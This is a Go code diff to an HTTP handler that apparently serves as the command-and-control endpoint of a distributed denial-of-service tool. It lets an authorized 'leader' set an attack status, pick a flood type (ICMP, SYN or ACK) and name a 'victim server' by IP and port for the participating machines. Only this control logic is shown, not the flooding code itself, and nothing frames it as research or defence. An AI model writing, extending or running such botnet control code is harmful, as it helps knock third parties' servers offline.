@@ -74,19 +74,30 @@ func HandleCamp(writer http.ResponseWriter, request *http.Request, d *Dispatcher
 	// update camp status
 	if request.Method == "PUT" {
 		if isAuthorized(request.Header.Get("Authorization"), d.cmp.Leader.AuthenticationHash) {
-			data, err := io.ReadAll(request.Body)
+			var cp CampSettings
+			err := json.NewDecoder(request.Body).Decode(&cp)
 			if err != nil {
 				http.Error(writer, err.Error(), http.StatusBadRequest)
 				return
 			}
-			status := string(data)
-			if status == StatusAttacking || status == StatusStopped {
-				d.cmp.Status = status
-				writer.WriteHeader(http.StatusOK)
-			} else {
+			if cp.Status != StatusAttacking && cp.Status != StatusStopped && cp.Status != "" {
 				http.Error(writer, "Invalid status", http.StatusBadRequest)
 				return
 			}
+			if cp.DDOSType != DDOSTypeICMP && cp.DDOSType != DDOSTypeSYN && cp.DDOSType != DDOSTypeACK && cp.DDOSType != "" {
+				http.Error(writer, "Invalid ddos type", http.StatusBadRequest)
+				return
+			}
+			if cp.VictimServer != "" {
+				ip, port, err := net.SplitHostPort(cp.VictimServer)
+				if err != nil || port == "" || net.ParseIP(ip) == nil {
+					http.Error(writer, "Invalid victim server", http.StatusBadRequest)
+					return
+				}
+			}
+			d.cmp.UpdateSettings(cp.Status, cp.VictimServer, cp.DDOSType)
+			writer.WriteHeader(http.StatusOK)
+
 		} else {
 			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
 			return
